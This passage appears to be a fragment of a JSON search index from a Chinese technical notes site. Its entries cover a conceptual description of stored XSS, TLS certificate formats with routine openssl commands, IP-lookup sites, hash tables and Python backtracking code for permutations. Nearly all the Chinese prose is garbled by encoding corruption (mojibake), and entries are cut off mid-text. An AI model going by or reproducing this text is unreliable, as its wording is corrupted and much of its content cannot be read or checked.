å­˜å‚¨å‹ ä¸Šé¢åå°„å‹æ”»å‡»è„šæœ¬ç›´æ¥ç»æœåŠ¡å™¨ï¼Œè½¬æ‰‹åè¿”å›æµè§ˆå™¨è§¦å‘æ‰§è¡Œ; å­˜å‚¨å‹å’Œå®ƒçš„åŒºåˆ«åœ¨äºèƒ½å¤Ÿå°†æ”»å‡»è„šæœ¬å…¥åº“å­˜å‚¨ï¼Œ åœ¨åé¢è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œå†å°†æ”»å‡»è„šæœ¬æ¸²æŸ“è¿›ç½‘é¡µï¼Œè¿”å›ç»™æµè§ˆå™¨è§¦å‘æ‰§è¡Œ. ä¸¾ä¸ªä¾‹å­, XSSæ”»å‡»å°±å¥½æ¯”æ”»å‡»è€…åœ¨æŸç½‘é¡µè®ºå›ä¸­å›å¤ä¸€ä¸ªå¸–å­ï¼Œ å¸–å­ä¸­åŒ…å«JSè„šæœ¬ï¼Œå›å¸–æäº¤æœåŠ¡å™¨åï¼Œå°±ä¼šå­˜å‚¨è‡³æ•°æ®åº“ã€‚ å…¶ä»–ç½‘å‹æŸ¥çœ‹è¿™ä¸ªå¸–å­åï¼Œåå°ä¼šè‡ªåŠ¨æŸ¥è¯¢è¯¥å¸–å­çš„å›å¸–å†…å®¹ï¼Œ ç„¶åæ„å»ºå‡ºå®Œæ•´ç½‘é¡µï¼Œè¿”å›æµè§ˆå™¨ã€‚ æ­¤æ—¶ï¼Œè¯¥ç½‘å‹æµè§ˆå™¨æ¸²æŸ“è¿”å›çš„ç½‘é¡µå·²ç»ä¸­æ‹›ï¼ è¯¥ç½‘å‹çš„æµè§ˆå™¨å·²ç»å˜æˆäº†é¶å­...","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-XSS-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-XSS-attack.html"},{"title":"ç”ŸæˆTLS(SSL)è¯ä¹¦","text":"opensslè§: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/openssl SSL: Secure Sockets Layer TLS: Transport Layer Security TLSä½¿ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•, é€šå¸¸æ˜¯RSAç®—æ³•. å…¬é’¥ã€ç§é’¥ã€ç­¾åä¿¡æ¯å…±åŒç»„æˆè¯ä¹¦. ç­¾åä¿¡æ¯åŒ…æ‹¬å¦‚ç»„ç»‡ä¿¡æ¯ã€CAæœºæ„ã€è¿‡æœŸæ—¶é—´ã€ç‰ˆæœ¬ç­‰ç­‰ä¸€åˆ‡èƒ½è¢«å®¢æˆ·ç«¯è¯†åˆ«çš„ä¿¡æ¯ TLS TLSå…¨ç§°Transport Layer Securityï¼Œæ˜¯â½¤äºåœ¨è”â½¹è®¡ç®—æœºä¹‹é—´å»ºâ½´ç»è¿‡èº«ä»½éªŒè¯å’ŒåŠ å¯†çš„é“¾æ¥çš„åè®®ã€‚ å…¶å‰èº«æ˜¯SSL(Secure Sockets Layer)ï¼Œæœ€åˆæ˜¯ç”±â½¹æ™¯å…¬å¸ï¼ˆNetscapeï¼‰ç ”å‘ï¼Œ äº1999å¹´è¢«IETFï¼ˆThe Internet Engineering Task Force - äº’è”â½¹â¼¯ç¨‹ä»»åŠ¡ç»„ï¼‰æ ‡å‡†åŒ–ï¼Œå®šä¹‰ä¸ºTLS 1.0 ã€‚ â½¬å‰æœ€æ–°ç‰ˆæœ¬ä¸º2018å¹´å‘å¸ƒçš„TLS 1.3ï¼Œè¯¦æƒ…å‚â»…RFC 8446ã€‚ TLSè¿â¾åœ¨TCP/IPå±‚ä¹‹ä¸Šã€åº”â½¤å±‚ä¹‹ä¸‹ï¼Œä¸ºåº”â½¤ç¨‹åºæä¾›åŠ å¯†æ•°æ®é€šé“ã€‚HTTPSå®é™…ä¸Šå°±æ˜¯HTTP over SSLï¼Œå®ƒä½¿â½¤é»˜è®¤ç«¯â¼443ï¼Œâ½½ä¸æ˜¯åƒHTTPé‚£æ ·ä½¿â½¤ç«¯â¼80æ¥å’ŒTCP/IPè¿›â¾é€šä¿¡ã€‚HTTPSå è®®ä½¿â½¤SSLåœ¨å‘é€â½…æŠŠåŸå§‹æ•°æ®è¿›â¾åŠ å¯†ï¼Œç„¶ååœ¨æ¥å—â½…è¿›â¾è§£å¯†ï¼ŒåŠ å¯†å’Œè§£å¯†éœ€è¦å‘é€â½…å’Œæ¥å— â½…é€šè¿‡äº¤æ¢å…±çŸ¥çš„å¯†é’¥æ¥å®ç°ï¼Œå› æ­¤ï¼Œæ‰€ä¼ é€çš„æ•°æ®ä¸å®¹æ˜“è¢«â½¹ç»œâ¿Šå®¢æˆªè·å’Œè§£å¯†ã€‚ TLS(SSL)è¯ä¹¦ TLSä½¿â½¤â¾®å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯RSAç®—æ³•ï¼Œæ‰€ä»¥TLSä¸­æœ‰ç§é’¥å’Œå…¬é’¥ã€‚ å…¬é’¥ã€ç§é’¥å’Œç­¾åä¿¡æ¯å…±åŒç»„æˆâ¼€ä¸ªè¯ä¹¦ï¼Œæ­¤å¤„çš„ç­¾åä¿¡æ¯åŒ…å«è¯¸å¤šæ‚é¡¹ï¼Œ â½å¦‚ç»„ç»‡ä¿¡æ¯ã€CAæœºæ„ã€è¿‡æœŸæ—¶é—´ã€ç‰ˆæœ¬ç­‰ç­‰â¼€åˆ‡èƒ½è¢«å®¢æˆ·ç«¯è¯†åˆ«çš„ä¿¡æ¯ã€‚ TLSè¯ä¹¦å¹¶â¾®ç§æœ‰æ ¼å¼ï¼Œâ½½æ˜¯ä½¿â½¤X.509è¯ä¹¦ã€‚X.509 æ˜¯å…¬é’¥è¯ä¹¦ã€æ•°å­—â½‚æ¡£çš„æ ‡å‡†æ ¼å¼ï¼Œä»–éµå¾ª é“¾å¼ç­¾ååŸåˆ™ã€‚å¯å®‰å…¨åœ°å°†åŠ å¯†å¯†é’¥å¯¹ä¸èº«ä»½ï¼ˆå¦‚â½¹ç«™ã€ä¸ªâ¼ˆæˆ–ç»„ç»‡ï¼‰ç›¸å…³è”ï¼Œè¯¦æƒ…å‚â»…RFC 5280ã€‚X.509è¯ä¹¦ä½¿â½¤åœºæ™¯ç›¸å½“â¼´æ³›ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹â¼ç§ï¼š â½¤äºç»è¿‡èº«ä»½éªŒè¯å’ŒåŠ å¯†çš„ Web æµè§ˆçš„ SSL/TLS å’Œ HTTPS é€šè¿‡ S/MIME åè®®ç­¾åå’ŒåŠ å¯†çš„ç”µâ¼¦é‚®ä»¶ â½‚ä»¶ç­¾å å®¢æˆ·ç«¯è®¤è¯ æ”¿åºœé¢å‘çš„ç”µâ¼¦èº«ä»½è¯ æ–‡ä»¶æ ¼å¼è¯´æ˜ ä½¿ç”¨PKCSï¼ˆThe Public-Key Cryptography Standardsï¼‰æ ‡å‡†: CAï¼š è¯ä¹¦è®¤è¯ä¸­å¿ƒï¼› æ”¶åˆ°è¯ä¹¦åéœ€è¦å»CAéªŒè¯æ­£ç¡®æ€§ã€çœŸå®æ€§ã€æœ‰æ•ˆæœŸç­‰. æ‰€ä»¥åœ¨å…¬ç½‘ä¸Šçš„é€šä¿¡, ä¸€èˆ¬éƒ½æ˜¯éœ€è¦æ‹¿è‡ªå·±çš„ .csr æ–‡ä»¶å»å®˜æ–¹CAæœºæ„ç­¾åçš„. CAè‡ªèº«çš„åˆ†å‘åŠå®‰å…¨ä¿è¯ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ä¸€äº›æƒå¨çš„æ¸ é“è¿›è¡Œçš„ï¼Œæ¯”å¦‚æ“ä½œç³»ç»Ÿä¼šå†…ç½®ä¸€äº›å®˜æ–¹çš„CAã€æµè§ˆå™¨ä¹Ÿä¼šå†…ç½®ä¸€äº›CA. æ ¹è¯ä¹¦å®é™…ä¸Šæ˜¯â¾ƒç­¾åè¯ä¹¦ï¼Œæ˜¯CAæœºæ„é¢å‘ç»™â¾ƒâ¼°çš„è¯ä¹¦ï¼Œæ˜¯ä¿¡ä»»é“¾çš„èµ·å§‹ç‚¹ã€‚ X.509: ä¸€ç§é€šç”¨çš„è¯ä¹¦æ ¼å¼, å®šä¹‰å…¬é’¥è¯ä¹¦æ ¼å¼çš„æ ‡å‡†, åŒ…å«è¯ä¹¦æŒæœ‰äººçš„å…¬é’¥, åŠ å¯†ç®—æ³•ç­‰ä¿¡æ¯; pkcs1 ~ pkcs12: å…¬é’¥åŠ å¯†(éå¯¹ç§°åŠ å¯†)çš„ä¸€ç§æ ‡å‡†(Public Key Cryptography Standards), ä¸€èˆ¬å­˜å‚¨ä¸º *.pN , æ˜¯åŒ…å«è¯ä¹¦å’Œå¯†é’¥çš„å°è£…æ ¼å¼; .key: ç§é’¥æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨rsaç®—æ³•ï¼Œç§é’¥éœ€è¦è‡ªå·±ä¿å­˜ï¼Œæ— éœ€æäº¤ç»™CAæœºæ„ .csr: è¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆè¯ä¹¦è¯·æ±‚æ–‡ä»¶, certificate signing requestï¼‰ï¼Œå«æœ‰æŒæœ‰äººçš„ä¿¡æ¯å¦‚å›½å®¶ã€é‚®ä»¶ã€åŸŸåç­‰. ç”Ÿæˆè¯¥æ–‡ä»¶æ—¶éœ€è¦ç”¨åˆ°è‡ªå·±çš„ç§é’¥ã€‚ .crt: CAè®¤è¯åçš„è¯ä¹¦æ–‡ä»¶ï¼Œcertificateçš„ç¼©å†™, æ­¤æ ¼å¼ä¸€èˆ¬ç”¨äº Linux; å­˜å‚¨æ ¼å¼å¯ä»¥æ˜¯ .pem çš„Base64, ä¹Ÿå¯ä»¥æ˜¯ .der çš„äºŒè¿›åˆ¶; å­˜å‚¨å†…å®¹ä¸ºå…¬é’¥ä¿¡æ¯ + é¢å¤–çš„å…¶ä»–ä¿¡æ¯ï¼ˆæ¯”å¦‚æ‰€å±çš„å®ä½“ï¼Œé‡‡ç”¨çš„åŠ å¯†è§£å¯†ç®—æ³•ç­‰ï¼‰; .cer: ä¸ .crt ä¸€è‡´(åªæ˜¯ä½¿ç”¨å¹³å°çš„å·®åˆ«), éƒ½æºäº \"certificate\", ä¸€èˆ¬ç”¨äº Windows; .crl: è¯ä¹¦åŠé”€åˆ—è¡¨ï¼ŒCertificate Revocation Listçš„ç¼©å†™ .pem: \"Privacy-Enhanced Mail\", ç›´è¯‘è¿‡æ¥å°±æ˜¯\"éšç§å¢å¼ºé‚®ä»¶\". è¯ä¹¦æˆ–å¯†é’¥çš„Base64æ–‡æœ¬å­˜å‚¨æ ¼å¼, å¯ä»¥å•ç‹¬å­˜æ”¾è¯ä¹¦æˆ–å¯†é’¥, ä¹Ÿå¯ä»¥åŒæ—¶å­˜æ”¾è¯ä¹¦å’Œå¯†é’¥, ä½¿ç”¨ç‰¹å®šçš„å¼€å¤´å’Œç»“å°¾è¡Œæ¥æ ‡è¯†å†…å®¹ç±»å‹(è¯ä¹¦/å¯†é’¥)ã€‚ (ä¸windowsä¸‹ä½¿ç”¨.pfxç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯.pemä½¿ç”¨base64å­—ç¬¦å­˜å‚¨ï¼Œè€Œ.pfxä½¿ç”¨äºŒè¿›åˆ¶å­˜å‚¨). .pfx: å¾®è½¯IISçš„å®ç°; .jks: Javaçš„keytoolå®ç°çš„è¯ä¹¦æ ¼å¼; .der: \"Distinguished Encoding Rules\"ï¼Œç›´è¯‘ä¸º\"å¯åˆ†è¾©ç¼–ç è§„åˆ™\". è¯ä¹¦çš„äºŒè¿›åˆ¶å­˜å‚¨æ ¼å¼. æœ€æµè¡Œçš„ç¼–ç æ ¼å¼. å°† .der è½¬æ¢ä¸º Base64 ç¼–ç åˆ™æ˜¯ .pem æ–‡ä»¶. æ€»å¾—æ¥è¯´è¿™äº›æ–‡ä»¶éƒ½ä¸X.509è¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶æœ‰å…³ï¼Œä»æ–‡ä»¶ç¼–ç ä¸Šåˆ†ï¼Œåªæœ‰ä¸¤å¤§ç±»: PEMæ ¼å¼ï¼šä½¿ç”¨Base64 ASCIIè¿›è¡Œç¼–ç çš„çº¯æ–‡æœ¬æ ¼å¼ DERæ ¼å¼ï¼šäºŒè¿›åˆ¶æ ¼å¼ æ–‡ä»¶å®é™…å†…å®¹æŸ¥çœ‹ä¸è½¬æ¢ å‡è®¾æœ‰ä¸€ä¸ªbaidu.crtæ–‡ä»¶ï¼Œ è¿™ä¸ªcrtæ–‡ä»¶çš„å®é™…æ ¼å¼å…¶å®æ˜¯pem(Base64æ ¼å¼), æœ‰ä¸€ä¸ªderæ ¼å¼çš„æ–‡ä»¶baidu.der(äºŒè¿›åˆ¶æ ¼å¼)æƒ³è¦çœ‹åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å®é™…å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤: openssl x509 -in baidu.crt -text -noout openssl x509 -inform der -in baidu.der -text -noout ä¸¤è€…æ–‡ä»¶çš„è½¬åŒ–ï¼Œä½¿ç”¨å‘½ä»¤: # pemè½¬der openssl x509 -outform der -in baidu.pem -out baidu.der # derè½¬pem openssl x509 -inform der -in baidu.der -out baidu.crt è€ŒCRT, CERï¼ŒKEYè¿™å‡ ç§è¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶ï¼Œåœ¨å­˜å‚¨ä¸ºç‰©ç†æ–‡ä»¶æ—¶ï¼Œæ—¢å¯ä»¥æ˜¯PEMæ ¼å¼ï¼Œä¹Ÿå¯ä»¥DERæ ¼å¼ã€‚ CERï¼šä¸€èˆ¬ç”¨äºwindowsçš„è¯ä¹¦æ–‡ä»¶æ ¼å¼ CRTï¼šä¸€èˆ¬ç”¨äºLinuxçš„è¯ä¹¦ï¼ŒåŒ…å«å…¬é’¥å’Œä¸»ä½“ä¿¡æ¯ KEYï¼šä¸€èˆ¬ç”¨äºå¯†é’¥ï¼Œç‰¹åˆ«æ˜¯ç§é’¥ å¯¹æ–‡ä»¶çš„åŠ å¯†è§£å¯† ç”Ÿæˆå…¬ç§é’¥å¯¹ æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªRSAçš„å…¬é’¥å’Œå¯†é’¥å¯¹: openssl genpkey -algorithm rsa -out rsa_private.key ä»è¯¥æ–‡ä»¶ä¸­ï¼Œæå–å‡ºå…¬é’¥: openssl rsa -pubout -in rsa_private.key -out rsa_pub.key æ–‡ä»¶åŠ /è§£å¯† å…ˆç”Ÿæˆä¸€ä¸ªæµ‹è¯•æ–‡ä»¶: echo \"a test\" > text.txt å¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŠ å¯†, é‡‡ç”¨å…¬é’¥å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†: openssl rsautl -encrypt -in text.txt -inkey rsa_pub.key -pubin -out text.en é‡‡ç”¨ç§é’¥è§£å¯†æ–‡ä»¶: openssl rsautl -decrypt -in text.en -inkey rsa_private.key a test æ—¢ç„¶æ˜¯éå¯¹ç§°åŠ å¯†ï¼Œé‚£æˆ‘ä»¬å°è¯•ä¸‹ç”¨ç§é’¥åŠ å¯†ï¼Œç”¨å…¬é’¥è§£å¯†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç§é’¥åŠ å¯†åœ¨opensslä¸­å¯¹åº”çš„æ˜¯-signè¿™ä¸ªé€‰é¡¹ï¼Œå…¬é’¥è§£å¯†å¯¹åº”çš„æ˜¯-verifyè¿™ä¸ªé€‰é¡¹ï¼Œå¦‚ä¸‹ï¼š ç”¨ç§é’¥å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼ˆç­¾åï¼‰: openssl rsautl -sign -in text.txt -inkey rsa_private.key -out text.en ç”¨å…¬é’¥å¯¹æ–‡ä»¶è¿›è¡Œè§£å¯†ï¼ˆæ ¡éªŒï¼‰: openssl rsautl -verify -in text.en -inkey rsa_pub.key -pubin this is a test æ³¨è§£ åˆ°è¿™é‡Œå¯ä»¥çœ‹å‡ºè¿™æ˜¯æœ‰å…¶ä»–å®‰å…¨é—®é¢˜çš„: å…¬é’¥æ˜¯å…¬å¼€åˆ†å‘çš„ï¼Œ ä½ æ— æ³•ç¡®å®šä½ æ”¶åˆ°çš„å…¬é’¥æ˜¯çœŸå®çš„, æ˜¯æ²¡æœ‰ç»è¿‡ç¯¡æ”¹çš„. æœåŠ¡å™¨è¯ä¹¦çš„ç”Ÿæˆ ç”ŸæˆCAæ ¹è¯ä¹¦(æ¨¡æ‹Ÿä¸€ä¸ªCAæœºæ„) æ­¥éª¤: ç”ŸæˆCAç§é’¥ï¼ˆ.keyï¼‰ ç”ŸæˆCAè¯ä¹¦è¯·æ±‚ï¼ˆ.csrï¼‰ è‡ªç­¾åå¾—åˆ°æ ¹è¯ä¹¦ï¼ˆ.crtï¼‰ å¤§è‡´æŒ‡ä»¤å¦‚ä¸‹: # Generate CA private key openssl genrsa -out ca.key 2048 # Generate CSR # è¿™ä¸€æ­¥ç”Ÿæˆ.csræ–‡ä»¶æ—¶ï¼Œéœ€è¦åœ¨æç¤ºä¸‹è¾“å…¥ç»„ç»‡ç›¸å…³çš„ä¿¡æ¯ openssl req -new -key ca.key -out ca.csr # Generate Self Signed certificateï¼ˆCA æ ¹è¯ä¹¦ï¼‰ openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt æ³¨è§£ ä¸€èˆ¬å†…ç½‘ä½¿ç”¨å°±ä½¿ç”¨è‡ªç­¾åçš„è¯ä¹¦, å…¬ç½‘ç”¨æ‰ä¼šå‘CAæœºæ„ç”³è¯· ç”Ÿæˆç”¨æˆ·è¯ä¹¦ æ­¥éª¤: ç”Ÿæˆç§é’¥ï¼ˆ.keyï¼‰ ç”Ÿæˆè¯ä¹¦è¯·æ±‚ï¼ˆ.csrï¼‰ ç”¨CAæ ¹è¯ä¹¦ç­¾åå¾—åˆ°è¯ä¹¦ï¼ˆ.crtï¼‰ å¤§è‡´æŒ‡ä»¤å¦‚ä¸‹: # private key, å¯ä»¥é€šè¿‡ `-passout pass:å¯†ç ` æ¥æŒ‡å®šå¯†é’¥å¯†ç  $openssl genrsa -des3 -out server.key 1024 # è‹¥éœ€è¦ç”Ÿæˆå…¬é’¥ $openssl rsa -in server.key -pubout -out server_public.pem # generate csr $openssl req -new -key server.key -out server.csr # generate certificate # ä½¿ç”¨äº†æ ¹è¯ä¹¦ca.crtä»¥åŠå¯¹åº”çš„ç§é’¥ca.keyæ¥è¿›è¡Œç­¾åï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„ç§é’¥server.key $openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key æ³¨è§£ ç”Ÿæˆ.pemæ–‡ä»¶ æœ‰æ—¶éœ€è¦ç”¨åˆ°pemæ ¼å¼çš„è¯ä¹¦ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼åˆå¹¶è¯ä¹¦æ–‡ä»¶ï¼ˆcrtï¼‰å’Œç§é’¥æ–‡ä»¶ï¼ˆkeyï¼‰æ¥ç”Ÿæˆ: cat server.crt server.key > server.pem åœ¨åˆ›å»ºè¯ä¹¦çš„æ—¶å€™ï¼Œå„ä¸ªå€¼çš„è®¾å®šå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œä½†æ˜¯\"Common Name\"çš„å€¼é€š å¸¸è¦åŒ…å«æœåŠ¡å™¨çš„ DNS ä¸»æœºåã€‚å¦‚æœä½ åªæ˜¯åœ¨æœ¬æœºæµ‹è¯•ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨\"localhost\"ï¼Œå¦ åˆ™ä½¿ç”¨æœåŠ¡å™¨çš„åŸŸåã€‚ å‚è€ƒ:: https://zhuanlan.zhihu.com/p/423506052 æˆ–è€…ç”¨æœ€å°‘æŒ‡ä»¤å®Œæˆä»caç­¾å‘åˆ°æœåŠ¡å™¨è¯ä¹¦ç”Ÿæˆ: # ç”ŸæˆCAè¯ä¹¦å’Œç§é’¥, -nodesè¡¨ç¤ºä¸åŠ å¯†, é»˜è®¤æ˜¯ä¼šåŠ å¯†çš„(å°±å¾—è¾“å…¥å¯†ç æ‰èƒ½è¿›å…¥ä¸‹ä¸€æ­¥) # è‹¥ä¸æ˜¯ç”¨ -nodes, å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œè®¾ç½®å¯†ç : `-passout pass:å¯†ç ` # openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt # -x509 è¡¨ç¤ºç›´æ¥ä½¿ç”¨è¯¥CSRç”Ÿæˆè‡ªç­¾åè¯ä¹¦,è€Œä¸éœ€è¦ç¬¬ä¸‰æ–¹CAç­¾å # -newkeyè¡¨ç¤ºç”Ÿæˆæ–°çš„ç§é’¥, rsa:2048 è¡¨ç¤ºæŒ‡å®šrsaç®—æ³•, é•¿åº¦ä¸º2048 openssl req -x509 -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt # ä½œä¸ºCA,ç­¾åå®¢æˆ·ç«¯è¯ä¹¦ openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.csr openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -days 365 -out server.crt è¿˜å¯ä»¥å¯åŠ¨ä¸€ä¸ªSSL/TLSæœåŠ¡å™¨(ä¸è¿‡ä¸çŸ¥é“å’‹ç”¨): # æˆ–è€…æœåŠ¡å™¨æŒ‡å®šCAè¯ä¹¦å’Œç§é’¥,ä»¥CAèº«ä»½è¿è¡Œ,éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦ # æœ¬åœ°å¯åŠ¨ä¸€ä¸ªSSL/TLSæœåŠ¡å™¨ï¼Œå¹¶åœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šæä¾›4433ç«¯å£ç”¨äºåŠ å¯†é€šä¿¡ openssl s_server -accept 4433 -cert ca.crt -key ca.key","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Generate-TLS-(SSL)-certificate.html","loc":"/yq-doc-source-docs-Safety-Generate-TLS-(SSL)-certificate.html"},{"title":"ä¸€äº›æœ‰ç”¨çš„ç½‘ç«™","text":"æœ¬æœºIPåœ°å€å¯¹åº”ä¿¡æ¯æŸ¥è¯¢: https://ip.skk.moe æŸ¥çœ‹æœ¬æœºå…¬ç½‘IP: https://www.whatismyip.com","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Some-useful-websites.html","loc":"/yq-doc-source-docs-Safety-Some-useful-websites.html"},{"title":"Hash","text":"Hashè¡¨, ä¹Ÿå«æ•£åˆ—è¡¨, é€šè¿‡å»ºç«‹é”® key ä¸å€¼ value ä¹‹é—´çš„æ˜ å°„ï¼Œå®ç°é«˜æ•ˆçš„å…ƒç´ æŸ¥è¯¢ã€‚ å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬å‘å“ˆå¸Œè¡¨ä¸­è¾“å…¥ä¸€ä¸ªé”® key ï¼Œåˆ™å¯ä»¥åœ¨ æ—¶é—´å†…è·å–å¯¹åº”çš„å€¼ value ã€‚ å®ç° è®¡ç®—æ‰€ç»™å€¼çš„çš„hashå€¼(hashå‡½æ•°) å°†1ä¸­å¾—åˆ°çš„å€¼å¯¹ä¸€ä¸ªç»™å®šçš„hashè¡¨å¤§å°å–æ¨¡, æ¥æ˜ å°„åˆ°è¿™ä¸ªè¡¨ç´¢å¼•: index = hash(key) % capacity å¯¹æ”¹æ•°æ®çš„æ“ä½œå°±å‘ç”Ÿåœ¨ index å¯¹åº”çš„åœ°å€(ä¸€èˆ¬å«Hashæ¡¶) Hashå†²çªè§£å†³: Hashè¡¨æ‰©å®¹ ç´¢å¼•æ‰€åœ¨æ¡¶çš„æ•°æ®ç»“æ„è½¬æ¢ä¸ºé“¾è¡¨ å‚è€ƒ: å“ˆå¸Œå†²çª","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-Have.html","loc":"/yq-doc-source-docs-data-structure-Have.html"},{"title":"å›æº¯ç®—æ³•","text":"å‚è€ƒ: å›æº¯æ³• ã€Œå›æº¯ç®—æ³• backtracking algorithmã€æ˜¯ä¸€ç§é€šè¿‡ç©·ä¸¾æ¥è§£å†³é—®é¢˜çš„æ–¹æ³•ï¼Œ å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ä»ä¸€ä¸ªåˆå§‹çŠ¶æ€å‡ºå‘ï¼Œæš´åŠ›æœç´¢æ‰€æœ‰å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼Œ å½“é‡åˆ°æ­£ç¡®çš„è§£åˆ™å°†å…¶è®°å½•ï¼Œç›´åˆ°æ‰¾åˆ°è§£æˆ–è€…å°è¯•äº†æ‰€æœ‰å¯èƒ½çš„é€‰æ‹©éƒ½æ— æ³•æ‰¾åˆ°è§£ä¸ºæ­¢ã€‚ å›æº¯ç®—æ³•é€šå¸¸é‡‡ç”¨\"æ·±åº¦ä¼˜å…ˆæœç´¢\"æ¥éå†è§£ç©ºé—´ã€‚ \"äºŒå‰æ ‘\"çš„å‰åºã€ä¸­åºå’Œååºéå†éƒ½å±äºæ·±åº¦ä¼˜å…ˆæœç´¢ã€‚ å‰ªæ å¤æ‚çš„å›æº¯é—®é¢˜é€šå¸¸åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªçº¦æŸæ¡ä»¶ï¼Œçº¦æŸæ¡ä»¶é€šå¸¸å¯ç”¨äº\"å‰ªæ\"ã€‚ \"å‰ªæ\"æ˜¯ä¸€ä¸ªéå¸¸å½¢è±¡çš„åè¯ã€‚ åœ¨æœç´¢è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬\"å‰ªæ‰\"äº†ä¸æ»¡è¶³çº¦æŸæ¡ä»¶çš„æœç´¢åˆ†æ”¯ï¼Œé¿å…è®¸å¤šæ— æ„ä¹‰çš„å°è¯•ï¼Œä»è€Œæé«˜äº†æœç´¢æ•ˆç‡ã€‚ å®ä¾‹-å…¨æ’åˆ—é—®é¢˜ ä»£ç : def backtrack( state: list[int], choices: list[int], selected: list[bool], res: list[list[int]] ): \"\"\"å›æº¯ç®—æ³•ï¼šå…¨æ’åˆ— I\"\"\" # å½“çŠ¶æ€é•¿åº¦ç­‰äºå…ƒç´ æ•°é‡æ—¶ï¼Œè®°å½•è§£ if len(state) == len(choices): res.append(list(state)) return # éå†æ‰€æœ‰é€‰æ‹© for i, choice in enumerate(choices): # å‰ªæï¼šä¸å…è®¸é‡å¤é€‰æ‹©å…ƒç´  if not selected[i]: # å°è¯•ï¼šåšå‡ºé€‰æ‹©ï¼Œæ›´æ–°çŠ¶æ€ selected[i] = True state.append(choice) # è¿›è¡Œä¸‹ä¸€è½®é€‰æ‹© backtrack(state, choices, selected, res) # å›é€€ï¼šæ’¤é”€é€‰æ‹©ï¼Œæ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ selected[i] = False state.pop() def permutations_i(nums: list[int]) -> list[list[int]]: \"\"\"å…¨æ’åˆ— I\"\"\" res = [] backtrack(state=[], choices=nums, selected=[False] * len(nums), res=res) return res ä½†æ˜¯å¦‚æœæœ‰é‡å¤å…ƒç´ æ€ä¹ˆåŠå‘¢? ä¼šå‡ºç°é‡å¤çš„ä¸¤ä¸ªæ ‘æ, è¿™ä¸ªæ—¶å€™ç®€å•è®°å½•å•æ¬¡çš„å³å¯: def backtrack( state: list[int], choices: list[int], selected: list[bool], res: list[list[int]] ): \"\"\"å›æº¯ç®—æ³•ï¼šå…¨æ’åˆ— II\"\"\" # å½“çŠ¶æ€é•¿åº¦ç­‰äºå…ƒç´ æ•°é‡æ—¶ï¼Œè®°å½•è§£ if len(state) == len(choices): res.append(list(state)) return # éå†æ‰€æœ‰é€‰æ‹© duplicated = set[int]() for i, choice in enumerate(choices): # å‰ªæï¼šä¸å…è®¸é‡å¤é€‰æ‹©å…ƒç´  ä¸” ä¸å…è®¸é‡å¤é€‰æ‹©ç›¸ç­‰å…ƒç´  if not selected[i] and choice not in duplicated: # å°è¯•ï¼šåšå‡ºé€‰æ‹©ï¼Œæ›´æ–°çŠ¶æ€ duplicated.add(choice) # è®°å½•é€‰æ‹©è¿‡çš„å…ƒç´ å€¼ selected[i] = True state.append(choice) # è¿›è¡Œä¸‹ä¸€è½®é€‰æ‹© backtrack(state, choices, selected, res) # å›é€€ï¼šæ’¤é”€é€‰æ‹©ï¼Œæ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ selected[i] = False state.pop() æ³¨æ„ä¸¤ä¸ªå˜é‡å‰ªææ•ˆæœ, selected å’Œ duplicated éƒ½ç”¨äºå‰ªæï¼Œä½†ä¸¤è€…çš„ç›®æ ‡ä¸åŒã€‚ é‡å¤é€‰æ‹©å‰ªæï¼šæ•´ä¸ªæœç´¢è¿‡ç¨‹ä¸­åªæœ‰ä¸€ä¸ª selected . å®ƒè®°å½•çš„æ˜¯å½“å‰çŠ¶æ€ä¸­åŒ…å«å“ªäº›å…ƒç´ ï¼Œå…¶ä½œç”¨æ˜¯é¿å…æŸä¸ªå…ƒç´ åœ¨ state ä¸­é‡å¤å‡ºç°ã€‚ ç›¸ç­‰å…ƒç´ å‰ªæï¼šæ¯è½®é€‰æ‹©ï¼ˆæ¯ä¸ªè°ƒç”¨çš„ backtrack å‡½æ•°ï¼‰éƒ½åŒ…å«ä¸€ä¸ª duplicated. å®ƒè®°å½•çš„æ˜¯åœ¨æœ¬è½®éå†ï¼ˆfor 